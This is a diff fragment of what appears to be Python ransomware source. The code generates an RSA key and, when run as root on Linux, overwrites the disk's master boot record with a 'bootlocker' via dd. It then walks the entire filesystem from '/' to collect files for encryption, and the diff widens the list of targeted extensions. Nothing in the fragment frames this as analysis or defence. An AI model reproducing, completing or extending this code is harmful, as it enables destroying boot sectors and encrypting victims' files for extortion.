@@ -21,7 +21,7 @@ ID = ''
 key = RSA.generate(2048)
 exKey = RSA.exportKey('PEM')
 
-
+# Check to see if we're on linux and have root, if so use dd to override the MBR with our bootlocker.
 if sys.platform == 'linux2' and gp.getuser() == 'root':
 	try:
 		os.system("dd if=boot.bin of=/dev/hda bs=512 count=1 && exit")
@@ -96,8 +96,9 @@ def selectfiles():
     ext = [".3g2", ".3gp", ".asf", ".asx", ".avi", ".flv", 
            ".m2ts", ".mkv", ".mov", ".mp4", ".mpg", ".mpeg",
            ".rm", ".swf", ".vob", ".wmv" ".docx", ".pdf",".rar",
-           ".jpg",".jpeg",".png", ".tiff", ".zip", ".7z", ".exe", 
-           ".tar.gz", ".tar", ".mp3", ".sh", ".c", ".h", ".txt"]
+           ".jpg", ".jpeg", ".png", ".tiff", ".zip", ".7z", ".exe", 
+           ".tar.gz", ".tar", ".mp3", ".sh", ".c", ".cpp", ".h",
+           ".mov", ".gif", ".txt", ".py", ".pyc" ]
            
     files_to_enc = []
     for root, dirs, files in os.walk("/"):
